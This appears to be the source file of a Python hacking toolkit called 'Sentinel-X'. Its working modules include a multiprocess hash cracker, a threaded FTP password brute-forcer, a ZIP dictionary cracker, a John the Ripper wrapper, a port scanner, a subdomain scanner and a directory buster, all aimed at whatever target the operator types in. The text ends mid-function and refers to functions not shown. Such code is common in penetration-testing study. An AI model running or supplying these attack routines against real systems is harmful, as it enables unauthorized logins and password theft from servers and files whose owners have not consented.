import hashlib
import time
import multiprocessing
import sys
import math
from itertools import product
import os
import socket
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import ftplib
import zipfile
import re
import base64
import http.server
import socketserver
import threading
import ast
import webbrowser
import webbrowser

# Optional Library Import Helper
def check_lib(lib_name):
    try:
        __import__(lib_name)
        return True
    except ImportError:
        return False

# Library Status Flags
YFINANCE_INSTALLED = check_lib("yfinance")
MATPLOTLIB_INSTALLED = check_lib("matplotlib")
PANDAS_INSTALLED = check_lib("pandas")
NUMPY_INSTALLED = check_lib("numpy")
REQUESTS_INSTALLED = check_lib("requests")
WHOIS_INSTALLED = check_lib("whois")
PARAMIKO_INSTALLED = check_lib("paramiko")
PILLOW_INSTALLED = check_lib("PIL")

# PyWiFi Special Handling
try:
    import pywifi
    from pywifi import const
    PYWIFI_INSTALLED = True
    PYWIFI_ERROR = None
except ImportError as e:
    PYWIFI_INSTALLED = False
    PYWIFI_ERROR = str(e)
except Exception as e:
    PYWIFI_INSTALLED = False
    PYWIFI_ERROR = str(e)

# Conditional Imports
if YFINANCE_INSTALLED: import yfinance as yf
if MATPLOTLIB_INSTALLED: import matplotlib.pyplot as plt
if PANDAS_INSTALLED: import pandas as pd
if NUMPY_INSTALLED: import numpy as np
if REQUESTS_INSTALLED: import requests
if WHOIS_INSTALLED: import whois
if PARAMIKO_INSTALLED: import paramiko
if PILLOW_INSTALLED: from PIL import Image; from PIL.ExifTags import TAGS

# Input Validation Helper
def get_validated_input(prompt_text, input_type=str, required=True, valid_range=None, default=None):
    """
    Robust input handler that loops until valid input is received.
    """
    while True:
        try:
            display_prompt = f"{prompt_text}"
            if default is not None:
                display_prompt += f" (Default: {default})"
            display_prompt += ": "
            
            user_input = input(Colors.HEADER + "[+] " + display_prompt + Colors.RESET).strip()
            
            if not user_input:
                if default is not None:
                    return default
                if not required:
                    return ""
                print(f"{Colors.RED}[!] Input is required.{Colors.RESET}")
                continue

            value = input_type(user_input)
            
            if valid_range:
                if isinstance(valid_range, range):
                    if value not in valid_range:
                        print(f"{Colors.RED}[!] Value must be between {valid_range.start} and {valid_range.stop - 1}.{Colors.RESET}")
                        continue
                elif isinstance(valid_range, list):
                    if value not in valid_range:
                        print(f"{Colors.RED}[!] Invalid choice. Options: {', '.join(map(str, valid_range))}.{Colors.RESET}")
                        continue
            
            return value
        except ValueError:
            print(f"{Colors.RED}[!] Invalid input type. Expected {input_type.__name__}.{Colors.RESET}")


# =================================================================================================
# CORE LOGIC (CLASSES AND WORKERS)
# =================================================================================================

CHARSETS = {
    '?l': 'abcdefghijklmnopqrstuvwxyz',
    '?u': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
    '?d': '0123456789',
    '?s': '!@#$%^&*()-_=+[]{}|;:,.<>?/~`'
}

def crack_worker(args):
    worker_id, num_workers, target_hash, hash_algo, mask_components, total_combinations, found_event, result_queue, stats_queue = args
    start_index = worker_id * total_combinations // num_workers
    end_index = (worker_id + 1) * total_combinations // num_workers
    charsets = [CHARSETS[comp] for comp in mask_components]
    len_prods = [1] * len(charsets)
    for i in range(len(charsets) - 2, -1, -1):
        len_prods[i] = len_prods[i+1] * len(charsets[i+1])
    local_count = 0
    for i in range(start_index, end_index):
        if local_count % 1000 == 0 and found_event.is_set(): return
        temp_i, candidate_chars = i, []
        for j in range(len(charsets)):
            charset_index = temp_i // len_prods[j]
            candidate_chars.append(charsets[j][charset_index])
            temp_i %= len_prods[j]
        candidate = "".join(candidate_chars)
        h = hashlib.new(hash_algo); h.update(candidate.encode('utf-8'))
        if h.hexdigest() == target_hash: 
            result_queue.put(candidate); found_event.set(); return
        local_count += 1
        if local_count % 20000 == 0: stats_queue.put(local_count); local_count = 0
    if local_count > 0: stats_queue.put(local_count)

class HashCracker:
    def __init__(self, hash_to_crack: str, mask: str):
        self.hash_to_crack, self.mask = hash_to_crack.lower(), mask
        self.hash_algo = self._detect_hash_type(self.hash_to_crack)
        self.mask_components = self._parse_mask(self.mask)
        if not self.hash_algo: raise ValueError(f"Could not determine hash type for hash of length {len(self.hash_to_crack)}.")
        if not self.mask_components: raise ValueError("Invalid mask format.")
        self.total_combinations = math.prod(len(CHARSETS[comp]) for comp in self.mask_components)

    def _detect_hash_type(self, hash_str: str) -> str:
        hash_len = len(hash_str)
        if hash_len == 32: return 'md5'
        if hash_len == 40: return 'sha1'
        if hash_len == 64: return 'sha256'
        return None

    def _parse_mask(self, mask: str) -> list:
        return re.findall(r'(\?[lusd])', mask)

    def _display_progress(self, start_time, tested_count):
        elapsed_time = time.time() - start_time or 1e-6
        hps = tested_count / elapsed_time
        eta = (self.total_combinations - tested_count) / hps if hps > 0 else float('inf')
        eta_str = time.strftime('%H:%M:%S', time.gmtime(eta)) if eta != float('inf') else 'N/A'
        progress = (tested_count / self.total_combinations) * 100
        sys.stdout.write(f"\r{Colors.WHITE}[+] Progress: {progress:.2f}% | H/s: {hps:,.0f} | ETA: {eta_str}    {Colors.RESET}"); sys.stdout.flush()

    def crack(self):
        num_workers = multiprocessing.cpu_count()
        print(f"{Colors.BLUE}[*] Engaging {num_workers} workers...{Colors.RESET}")
        print(f"[*] Target Hash: {self.hash_to_crack} ({self.hash_algo})")
        with multiprocessing.Manager() as manager:
            found_event, result_queue, stats_queue = manager.Event(), manager.Queue(), manager.Queue()
            args = (self.hash_algo, self.mask_components, self.total_combinations, found_event, result_queue, stats_queue)
            worker_args = [(i, num_workers, self.hash_to_crack, *args) for i in range(num_workers)]
            user_cancelled = False
            try:
                with multiprocessing.Pool(processes=num_workers) as pool:
                    pool.map_async(crack_worker, worker_args)
                    start_time, total_tested = time.time(), 0
                    while not found_event.is_set():
                        if not any(p.is_alive() for p in multiprocessing.active_children()): break
                        while not stats_queue.empty(): total_tested += stats_queue.get()
                        self._display_progress(start_time, total_tested)
                        if total_tested >= self.total_combinations: break
                        time.sleep(0.1)
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Operator terminated process. Shutting down...{Colors.RESET}"); user_cancelled = True; found_event.set()
            sys.stdout.write('\r' + ' ' * 80 + '\r')
            if found_event.is_set() and not user_cancelled:
                try: print(f"{Colors.GREEN}{Colors.BOLD}[SUCCESS] Password found: {result_queue.get_nowait()}{Colors.RESET}")
                except Exception: print(f"{Colors.RED}[!] Race condition: Event set, but password queue empty.{Colors.RESET}")
            elif user_cancelled: print(f"{Colors.PURPLE}[CANCELLED] Process aborted by operator.{Colors.RESET}")
            else: print(f"{Colors.RED}[FAILURE] Password not found.{Colors.RESET}")

# =================================================================================================
# UI AND MENU FUNCTIONS
# =================================================================================================

class Colors:
    # Sentinel-X Cyberpunk Palette
    RESET = '\033[0m'
    BOLD = '\033[1m'
    
    # Core Palette
    CYBER_CYAN = '\033[38;2;0;255;255m'      # #00FFFF - Main Header/Accent
    ELECTRIC_PURPLE = '\033[38;2;188;19;254m' # #BC13FE - Secondary/Menus
    ACID_GREEN = '\033[38;2;57;255;20m'       # #39FF14 - Success/Good
    RETRO_RED = '\033[38;2;255;0;60m'         # #FF003C - Error/Failure
    WARNING_YELLOW = '\033[38;2;253;253;0m'   # #FDFD00 - Warning
    HIGH_VIZ_WHITE = '\033[38;2;240;240;240m' # #F0F0F0 - Main Text
    GRAY = '\033[38;2;100;100;100m'           # #646464 - Subtext/Borders
    
    # UI Semantic Mappings
    HEADER = CYBER_CYAN
    ACCENT = ELECTRIC_PURPLE
    TEXT = HIGH_VIZ_WHITE
    SUCCESS = ACID_GREEN
    ERROR = RETRO_RED
    WARNING = WARNING_YELLOW
    BORDER = GRAY
    
    # Compatibility Mappings (for existing calls)
    BLUE = CYBER_CYAN
    GREEN = ACID_GREEN
    RED = RETRO_RED
    YELLOW = WARNING_YELLOW
    PURPLE = ELECTRIC_PURPLE
    WHITE = HIGH_VIZ_WHITE
    CYAN = CYBER_CYAN
    INDEX = ACCENT

def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""{Colors.BORDER}
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║ {Colors.CYBER_CYAN}  ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗     ██╗  ██╗ {Colors.BORDER}║
    ║ {Colors.CYBER_CYAN}  ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║     ╚██╗██╔╝ {Colors.BORDER}║
    ║ {Colors.CYBER_CYAN}  ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║      ╚███╔╝  {Colors.BORDER}║
    ║ {Colors.CYBER_CYAN}  ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║      ██╔██╗  {Colors.BORDER}║
    ║ {Colors.CYBER_CYAN}  ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗██╔╝ ██╗ {Colors.BORDER}║
    ║ {Colors.CYBER_CYAN}  ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝ {Colors.BORDER}║
    ╠═══════════════════════════════════════════════════════════════════════════╣
    ║ {Colors.TEXT}  >> SYSTEM STATUS: {Colors.SUCCESS}ONLINE{Colors.TEXT} | {Colors.TEXT}SECURITY LEVEL: {Colors.ERROR}MAXIMUM{Colors.TEXT} | {Colors.TEXT}VER: {Colors.ACCENT}2.0.1{Colors.BORDER}     ║
    ╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

def get_prompt(): return f"{Colors.BORDER}┌──({Colors.ACCENT}sentinel{Colors.BORDER})-[{Colors.TEXT}~{Colors.BORDER}]\n└─{Colors.SUCCESS}▶ {Colors.RESET}"
def pause(): input(f"\n{Colors.BORDER}[{Colors.ACCENT}?{Colors.BORDER}] Press Enter to return to mainframe...{Colors.RESET}")

# --- Individual Tool UIs (Leaf Functions) ---

def start_cracker_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}HASH CRACKER MODULE {Colors.BORDER}]══╗{Colors.RESET}\n")
    try:
        hash_to_crack = get_validated_input("Target Hash")
        mask = get_validated_input("Mask Pattern (e.g., ?u?l?d?d)")
        cracker = HashCracker(hash_to_crack=hash_to_crack, mask=mask); cracker.crack()
    except Exception as e: print(f"\n{Colors.RED}[!] Error initializing cracker: {e}{Colors.RESET}")

def john_the_ripper_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}JOHN THE RIPPER INTERFACE {Colors.BORDER}]══╗{Colors.RESET}\n")
    
    john_path = get_john_path("john")
    if not john_path:
        print(f"{Colors.RED}[!] John the Ripper binary not found.{Colors.RESET}")
        print(f"{Colors.TEXT}    Please install JtR (Jumbo) and place it in the script folder or add to PATH.{Colors.RESET}")
        return

    print(f"{Colors.GREEN}[+] Found JtR at: {john_path}{Colors.RESET}")
    
    hash_file = get_validated_input("Path to Hash File")
    if not os.path.exists(hash_file):
        print(f"{Colors.RED}[!] Hash file not found.{Colors.RESET}"); return
        
    wordlist = get_validated_input("Path to Wordlist (Leave empty for Incremental Mode)", required=False)
    format_spec = get_validated_input("Hash Format (e.g., raw-md5, leave empty to auto-detect)", required=False)
    
    cmd = [john_path, hash_file]
    if wordlist:
        if not os.path.exists(wordlist):
             print(f"{Colors.RED}[!] Wordlist not found.{Colors.RESET}"); return
        cmd.append(f"--wordlist={wordlist}")
    else:
        print(f"{Colors.YELLOW}[*] No wordlist provided. Using Incremental Mode.{Colors.RESET}")
        cmd.append("--incremental")
        
    if format_spec:
        cmd.append(f"--format={format_spec}")
        
    print(f"\n{Colors.ACCENT}[*] Launching John the Ripper... (Ctrl+C to stop){Colors.RESET}")
    print(f"{Colors.TEXT}    Command: {' '.join(cmd)}{Colors.RESET}\n")
    
    try:
        subprocess.run(cmd)
        print(f"\n{Colors.GREEN}[*] Process finished. To view cracked passwords run:{Colors.RESET}")
        print(f"{Colors.TEXT}    {john_path} --show {hash_file}{Colors.RESET}")
        
        if input(f"\n{Colors.BLUE}[?] View cracked passwords now? (y/n): {Colors.RESET}").lower() == 'y':
            subprocess.run([john_path, "--show", hash_file])
            
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] JtR interrupted by operator.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] An error occurred: {e}{Colors.RESET}")

def hash_generator_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}HASH GENERATOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    text_to_hash = get_validated_input("Enter text to hash")
    print("\n" + f"{Colors.TEXT}" + "="*70 + f"{Colors.RESET}")
    for algo in ['md5', 'sha1', 'sha256', 'sha512']:
        h = hashlib.new(algo); h.update(text_to_hash.encode())
        print(f"{Colors.ACCENT}{algo.upper():<8}: {Colors.TEXT}{h.hexdigest()}{Colors.RESET}")
    print(f"{Colors.TEXT}" + "="*70 + f"{Colors.RESET}")

def base64_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}BASE64 ENCODER / DECODER {Colors.BORDER}]══╗{Colors.RESET}\n")
    print(f" {Colors.ACCENT}[1]{Colors.TEXT} Encode to Base64{Colors.RESET}\n {Colors.ACCENT}[2]{Colors.TEXT} Decode from Base64{Colors.RESET}\n")
    choice = get_validated_input("Select Option", valid_range=["1", "2"])
    
    if choice == '1':
        text_to_encode = get_validated_input("Enter text to encode").encode()
        print(f"\n{Colors.GREEN}Encoded:{Colors.RESET} {Colors.TEXT}{base64.b64encode(text_to_encode).decode()}{Colors.RESET}")
    elif choice == '2':
        text_to_decode = get_validated_input("Enter Base64 to decode")
        try: print(f"\n{Colors.GREEN}Decoded:{Colors.RESET} {Colors.TEXT}{base64.b64decode(text_to_decode).decode()}{Colors.RESET}")
        except Exception as e: print(f"\n{Colors.RED}[!] Invalid Base64 or decoding error: {e}{Colors.RESET}")

# --- Menu Functions (Branch Functions) ---

def crypto_menu():
    menu_map = {
        '1': ("Hash Cracker (Python Mask Attack)", start_cracker_ui),
        '2': ("John the Ripper (CPU Hybrid Cracker)", john_the_ripper_ui),
        '3': ("Hashcat (GPU Accelerated Cracker)", hashcat_ui),
        '4': ("Hash Generator", hash_generator_ui),
        '5': ("Base64 Util", base64_ui)
    }
    while True:
        try:
            display_banner()
            print(f"{Colors.BORDER}╔════[ {Colors.HEADER}CRYPTOGRAPHY MODULES {Colors.BORDER}]════╗{Colors.RESET}\n")
            for key, (name, _) in menu_map.items(): 
                print(f"{Colors.BORDER}║ {Colors.ACCENT}[{key}]{Colors.TEXT} {name:<41} {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╠══════════════════════════════════════════════════╣{Colors.RESET}")
            print(f"{Colors.BORDER}║ {Colors.ACCENT}[9]{Colors.TEXT} Return to Mainframe                     {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╚══════════════════════════════════════════════════╝{Colors.RESET}\n")
            choice = input(get_prompt())
            if choice in menu_map: menu_map[choice][1](); pause()
            elif choice == '9': return
            else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}[!] Operation Cancelled. Returning to Cryptography Menu...{Colors.RESET}")
            time.sleep(1.5)

def subdomain_scanner_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}SUBDOMAIN SCANNER {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not REQUESTS_INSTALLED: print(f"{Colors.RED}[!] Requests library not found. Run 'pip install requests'{Colors.RESET}"); return
    domain = get_validated_input("Target Domain (e.g., example.com)")
    wordlist_path = get_validated_input("Path to Subdomain Wordlist")
    
    if not os.path.exists(wordlist_path): print(f"\n{Colors.RED}[!] Wordlist not found: {wordlist_path}{Colors.RESET}"); return
    print(f"\n{Colors.ACCENT}[*] Starting subdomain scan for {domain}...{Colors.RESET}")
    
    with open(wordlist_path, 'r', errors='ignore') as f: subdomains = [line.strip() for line in f if line.strip()]
    found_subdomains = []
    
    stop_event = threading.Event()
    
    def check_subdomain(sub):
        if stop_event.is_set(): return None
        try:
            url = f"http://{sub}.{domain}"
            requests.get(url, timeout=3)
            return url
        except (requests.ConnectionError, requests.Timeout): return None
        except Exception: return None
        
    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
            future_to_sub = {executor.submit(check_subdomain, sub): sub for sub in subdomains}
            for i, future in enumerate(as_completed(future_to_sub)):
                if stop_event.is_set(): break
                sys.stdout.write(f"\r{Colors.TEXT}[*] Progress: {((i + 1) / len(subdomains)) * 100:.1f}%{Colors.RESET}"); sys.stdout.flush()
                if result := future.result():
                    print(f"\r{Colors.GREEN}[+] Found: {result}{' ' * 40}{Colors.RESET}"); found_subdomains.append(result)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scan interrupted by operator.{Colors.RESET}")
        stop_event.set()
    
    if not found_subdomains: print(f"\n\n{Colors.ACCENT}[*] Scan complete. No subdomains found.{Colors.RESET}")
    else: print(f"\n\n{Colors.GREEN}[*] Scan complete. Found {len(found_subdomains)} subdomain(s).{Colors.RESET}")

def dir_buster_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}DIRECTORY BUSTER {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not REQUESTS_INSTALLED: print(f"{Colors.RED}[!] Requests library not found. Run 'pip install requests'{Colors.RESET}"); return
    url = get_validated_input("Target URL (e.g., http://example.com)")
    wordlist_path = get_validated_input("Path to Directory Wordlist")
    
    if not os.path.exists(wordlist_path): print(f"\n{Colors.RED}[!] Wordlist not found: {wordlist_path}{Colors.RESET}"); return
    print(f"\n{Colors.ACCENT}[*] Starting directory busting on {url}...{Colors.RESET}")
    
    with open(wordlist_path, 'r', errors='ignore') as f: paths = [line.strip() for line in f if line.strip()]
    try:
        for i, path in enumerate(paths):
            if i % 10 == 0 and sys.stdin in enumerate(range(0)): pass # Dummy check to allow interrupt in single thread
            target_url = f"{url.rstrip('/')}/{path}"
            sys.stdout.write(f"\r{Colors.TEXT}[*] Progress: {((i + 1) / len(paths)) * 100:.1f}% | Checking: /{path}{' ' * 20}{Colors.RESET}"); sys.stdout.flush()
            try:
                response = requests.head(target_url, timeout=3, allow_redirects=False)
                if response.status_code in [200, 204, 301, 302, 307, 401, 403]:
                    print(f"\r{Colors.GREEN}[+] Found: {target_url} (Status: {response.status_code}){' ' * 40}{Colors.RESET}")
            except (requests.RequestException, requests.Timeout): continue
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Operation interrupted.{Colors.RESET}")
    print(f"\n\n{Colors.ACCENT}[*] Directory busting complete.{Colors.RESET}")

def whois_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}WHOIS LOOKUP {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not WHOIS_INSTALLED: print(f"{Colors.RED}[!] python-whois library not found. Run 'pip install python-whois'{Colors.RESET}"); return
    domain = get_validated_input("Enter domain for Whois lookup (e.g., example.com)")
    print(f"\n{Colors.ACCENT}[*] Performing Whois lookup for {domain}...{Colors.RESET}")
    try:
        w = whois.whois(domain)
        if w.domain_name: print(f"\n{Colors.TEXT}{w}{Colors.RESET}")
        else: print(f"\n{Colors.RED}[!] No Whois information found for {domain}.{Colors.RESET}")
    except Exception as e: print(f"\n{Colors.RED}[!] Whois lookup failed: {e}{Colors.RESET}")

def network_scanner_menu():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}NETWORK SCANNER {Colors.BORDER}]══╗{Colors.RESET}\n")
    target = get_validated_input("Target IP address")
    ports_str = get_validated_input("Port range (e.g., 1-1024)")

    try:
        start_port, end_port = map(int, ports_str.split('-'))
        if start_port > end_port: raise ValueError
    except ValueError:
        print(f"\n{Colors.RED}[!] Invalid port range format. Use start-end (e.g., 1-1024).{Colors.RESET}")
        return

    print(f"\n{Colors.ACCENT}[*] Scanning {target} for open ports...{Colors.RESET}")
    open_ports = []
    stop_event = threading.Event()

    def scan_port(port):
        if stop_event.is_set(): return None
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    return port
        except: return None
        return None

    try:
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(scan_port, port): port for port in range(start_port, end_port + 1)}
            for i, future in enumerate(as_completed(futures)):
                if stop_event.is_set(): break
                sys.stdout.write(f"\r{Colors.TEXT}[*] Progress: {((i + 1) / (end_port - start_port + 1)) * 100:.1f}%{Colors.RESET}"); sys.stdout.flush()
                result = future.result()
                if result is not None:
                    print(f"\r{Colors.GREEN}[+] Port {result} is open.{' ' * 40}{Colors.RESET}")
                    open_ports.append(result)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user.{Colors.RESET}")
        stop_event.set()

    if not open_ports:
        print(f"\n\n{Colors.ACCENT}[*] Scan complete. No open ports found in the specified range.{Colors.RESET}")
    else:
        print(f"\n\n{Colors.GREEN}[*] Scan complete. Found {len(open_ports)} open port(s).{Colors.RESET}")

def ftp_brute_force_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}FTP BRUTE-FORCE {Colors.BORDER}]══╗{Colors.RESET}\n")
    server = get_validated_input("FTP Server IP")
    username = get_validated_input("Username")
    wordlist_path = get_validated_input("Path to Password Wordlist")

    if not os.path.exists(wordlist_path):
        print(f"\n{Colors.ERROR}[!] Wordlist not found at: {wordlist_path}{Colors.RESET}")
        return

    print(f"\n{Colors.BLUE}[*] Starting FTP brute-force on {server} for user '{username}'...{Colors.RESET}")
    found_event = multiprocessing.Event()

    def try_password(password, found_event):
        if found_event.is_set():
            return None
        ftp = None
        try:
            ftp = ftplib.FTP(server, timeout=5)
            ftp.login(username, password)
            print(f"\r{Colors.GREEN}{Colors.BOLD}[SUCCESS] Login successful! Password: {password}{' ' * 40}{Colors.RESET}")
            found_event.set()
            return password
        except ftplib.error_perm:
            return None
        except Exception:
            return None
        finally:
            if ftp:
                try:
                    ftp.quit()
                except Exception:
                    pass

    with open(wordlist_path, 'r', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    found_password = None
    try:
        with ThreadPoolExecutor(max_workers=20) as executor:
            future_to_pass = {executor.submit(try_password, p, found_event): p for p in passwords}
            for i, future in enumerate(as_completed(future_to_pass)):
                if found_event.is_set():
                    found_password = future.result()
                    break
                sys.stdout.write(f"\r{Colors.WHITE}[*] Progress: {((i + 1) / len(passwords)) * 100:.1f}% | Testing: {future_to_pass[future]:<20}{Colors.RESET}"); sys.stdout.flush()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Brute-force cancelled by user.{Colors.RESET}")
        found_event.set()

    if found_password:
        print(f"\n\n{Colors.GREEN}[*] Attack finished. Password found!{Colors.RESET}")
    else:
        print(f"\n\n{Colors.PURPLE}[*] Attack finished. Password not found in wordlist.{Colors.RESET}")

def tshark_capture_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}TSHARK PACKET CAPTURE {Colors.BORDER}]══╗{Colors.RESET}\n")

    try:
        subprocess.run(['tshark', '--version'], check=True, capture_output=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{Colors.RED}[!] TShark not found. Please install Wireshark and ensure 'tshark' is in your system's PATH.{Colors.RESET}")
        return

    print(f"{Colors.BLUE}[*] Discovering network interfaces...{Colors.RESET}")
    selected_iface = ''
    try:
        result = subprocess.run(['tshark', '-D'], check=True, capture_output=True, text=True, timeout=10)
        interfaces_output = result.stdout + result.stderr
        interfaces = [line.strip() for line in interfaces_output.splitlines() if line.strip() and not line.startswith('tshark:') and not line.startswith('Capturing on')]
        
        if not interfaces:
            print(f"{Colors.WHITE}[!] Could not auto-detect interfaces. Please enter one manually.{Colors.RESET}")
        else:
            print(f"{Colors.WHITE}Available Interfaces:{Colors.RESET}")
            for i, iface in enumerate(interfaces, 1):
                print(f"  [{i}] {iface}")
            print("")
            choice = input(f"{Colors.BLUE}[+] Select interface (number) or enter name: {Colors.RESET}")
            if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
                # TShark interface list format: "1. DeviceName (Description)"
                selected_line = interfaces[int(choice) - 1]
                # We need the index number for windows (usually) or the name for linux?
                # Actually, tshark -i <number> works on both generally if it matches the -D index.
                selected_iface = str(int(choice))
            else:
                selected_iface = choice # User entered a name manually

    except Exception as e:
        print(f"\n{Colors.RED}[!] Error discovering interfaces: {e}{Colors.RESET}")
    
    if not selected_iface:
        selected_iface = input(f"{Colors.BLUE}[+] Enter interface name/number manually: {Colors.RESET}")
        if not selected_iface:
             print(f"\n{Colors.RED}[!] Interface is required.{Colors.RESET}")
             return

    try:
        packet_count = input(f"{Colors.BLUE}[+] Number of packets to capture (e.g., 50): {Colors.RESET}")
        count = int(packet_count)
    except ValueError:
        print(f"\n{Colors.RED}[!] Invalid number. Defaulting to 10.{Colors.RESET}")
        count = 10

    print(f"\n{Colors.BLUE}[*] Starting capture on interface '{selected_iface}' for {count} packets... (Press Ctrl+C to stop){Colors.RESET}")
    command = ['tshark', '-i', selected_iface, '-c', str(count)]
    
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=60)
        
        print("\n" + "="*70)
        print(f"{Colors.GREEN}Capture Output:{Colors.RESET}")
        print(stdout)
        if stderr:
            print("\n" + "="*70)
            print(f"{Colors.PURPLE}Capture Errors/Warnings:{Colors.RESET}")
            print(stderr)
        print("="*70)
        print(f"\n{Colors.GREEN}[*] Capture complete.{Colors.RESET}")

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Capture stopped by user.{Colors.RESET}")
        try: process.kill()
        except: pass
    except FileNotFoundError:
        print(f"\n{Colors.RED}[!] TShark not found. Make sure it's in your system PATH.{Colors.RESET}")
    except subprocess.TimeoutExpired:
        print(f"\n{Colors.RED}[!] Capture timed out after 60 seconds.{Colors.RESET}")
        try: process.kill()
        except: pass
    except Exception as e:
        print(f"\n{Colors.RED}[!] An error occurred during capture: {e}{Colors.RESET}")
        print(f"{Colors.PURPLE}  - Try running this tool with administrator/root privileges.{Colors.RESET}")
        print(f"{Colors.PURPLE}  - Ensure the selected interface '{selected_iface}' is correct.{Colors.RESET}")
        try: process.kill()
        except: pass

def zip_cracker_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}ZIP ARCHIVE CRACKER {Colors.BORDER}]══╗{Colors.RESET}\n")
    zip_path = get_validated_input("Path to ZIP file")
    wordlist_path = get_validated_input("Path to Password Wordlist")

    if not os.path.exists(zip_path):
        print(f"\n{Colors.ERROR}[!] ZIP file not found at: {zip_path}{Colors.RESET}")
        return
    if not os.path.exists(wordlist_path):
        print(f"\n{Colors.ERROR}[!] Wordlist not found at: {wordlist_path}{Colors.RESET}")
        return

    try:
        zip_file = zipfile.ZipFile(zip_path)
        is_encrypted = any(z.flag_bits & 0x1 for z in zip_file.infolist())
        if not is_encrypted:
             print(f"\n{Colors.PURPLE}[!] The ZIP file does not appear to be password protected.{Colors.RESET}")
             zip_file.close()
             return
    except zipfile.BadZipFile:
        print(f"\n{Colors.RED}[!] Invalid ZIP file.{Colors.RESET}")
        return
    except Exception as e:
        print(f"\n{Colors.RED}[!] An error occurred while opening the ZIP file: {e}{Colors.RESET}")
        return

    print(f"\n{Colors.BLUE}[*] Starting dictionary attack on {os.path.basename(zip_path)}...{Colors.RESET}")
    found_event = multiprocessing.Event()

    def try_password(password_bytes, found_event):
        if found_event.is_set():
            return None
        try:
            # Test the password on the first file in the archive
            zip_file.extract(zip_file.infolist()[0], pwd=password_bytes)
            return password_bytes.decode('utf-8', 'ignore')
        except (RuntimeError, zipfile.BadZipFile, zipfile.zlib.error):
            return None
        except Exception:
            return None

    with open(wordlist_path, 'r', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    found_password = None
    try:
        with ThreadPoolExecutor(max_workers=multiprocessing.cpu_count() * 2) as executor:
            future_to_pass = {executor.submit(try_password, p.encode('utf-8', 'ignore'), found_event): p for p in passwords}
            for i, future in enumerate(as_completed(future_to_pass)):
                if found_event.is_set():
                    break
                password_str = future_to_pass[future]
                sys.stdout.write(f"\r{Colors.WHITE}[*] Progress: {((i + 1) / len(passwords)) * 100:.1f}% | Testing: {password_str:<20}{Colors.RESET}"); sys.stdout.flush()
                result = future.result()
                if result:
                    found_password = result
                    print(f"\r{Colors.GREEN}{Colors.BOLD}[SUCCESS] Password found: {found_password}{' ' * 40}{Colors.RESET}")
                    found_event.set()
                    for f_item in future_to_pass:
                        f_item.cancel()
                    break
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Zip cracker interrupted by operator.{Colors.RESET}")
        found_event.set()
    
    zip_file.close()
    if found_password:
        print(f"\n\n{Colors.GREEN}[*] Attack finished. Password found!{Colors.RESET}")
    else:
        print(f"\n\n{Colors.PURPLE}[*] Attack finished. Password not found in wordlist.{Colors.RESET}")

def spam_detector_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}SPAM DETECTOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    print(f"{Colors.BLUE}Enter the text/message to analyze. Press Ctrl+Z (Windows) or Ctrl+D (Unix) on a new line when done.{Colors.RESET}")
    lines = sys.stdin.readlines()
    text_to_analyze = "".join(lines)

    if not text_to_analyze.strip():
        print(f"\n{Colors.RED}[!] No text provided to analyze.{Colors.RESET}")
        return

